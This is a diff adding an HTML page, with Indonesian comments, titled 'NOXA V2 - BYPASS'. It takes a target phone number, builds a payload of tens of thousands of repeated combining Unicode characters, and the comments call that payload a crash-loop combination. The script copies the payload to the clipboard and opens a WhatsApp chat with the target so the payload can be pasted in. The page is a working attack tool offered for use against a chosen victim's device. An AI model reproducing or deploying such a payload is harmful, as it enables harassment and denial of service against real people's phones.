@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>NOXA CORE - BYPASS SYSTEM</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; }
+        .main { border: 1px solid #00ff41; width: 500px; margin: 50px auto; padding: 20px; box-shadow: 0 0 15px #00ff41; }
+        input { width: 80%; padding: 10px; background: #000; border: 1px solid #00ff41; color: #fff; margin: 10px 0; }
+        .warn { color: red; font-size: 12px; margin-bottom: 10px; }
+        button { background: #00ff41; color: #000; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; width: 85%; }
+        #console { background: #000; height: 120px; border: 1px dashed #00ff41; margin-top: 15px; padding: 10px; font-size: 11px; text-align: left; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <h2>[ NOXA V2 - BYPASS ]</h2>
+        <div class="warn">STATUS: SURS CORE ACTIVE - NO LIMITS</div>
+        <input type="text" id="num" placeholder="628xxxxxxxxx">
+        <button onclick="deployNoxa()">GENERATE & ATTACK</button>
+        <div id="console">> Awaiting input...</div>
+    </div>
+
+    <script>
+        function deployNoxa() {
+            let n = document.getElementById('num').value;
+            let c = document.getElementById('console');
+            if(!n) return alert("Target kosong!");
+
+            c.innerHTML = "> Connecting to Surs Core...";
+            
+            // Payload Gabungan: Unicode Khmer + Buggy Thai + Overflow String
+            // Ini adalah kombinasi paling mematikan untuk crash loop
+            let p = "NOXA_V2_OVERRIDE_" + "ॣ".repeat(8000) + "꧀".repeat(8000) + "ဪ".repeat(8000);
+
+            setTimeout(() => {
+                c.innerHTML += "<br>> Generating Payload Bypass...";
+                // Create a temporary textarea to copy the payload
+                let t = document.createElement("textarea");
+                t.value = p;
+                document.body.appendChild(t);
+                t.select();
+                document.execCommand("copy"); // Salin otomatis ke clipboard
+                document.body.removeChild(t);
+
+                setTimeout(() => {
+                    c.innerHTML += "<br>> PAYLOAD COPIED TO CLIPBOARD!";
+                    c.innerHTML += "<br>> REDIRECTING TO WHATSAPP...";
+                    
+                    // Menggunakan wa.me yang lebih stabil daripada api.whatsapp
+                    setTimeout(() => {
+                        window.location.href = "https://wa.me/" + n + "?text=" + encodeURIComponent("SYSTEM_FAILURE: _Paste_Payload_Disini_");
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
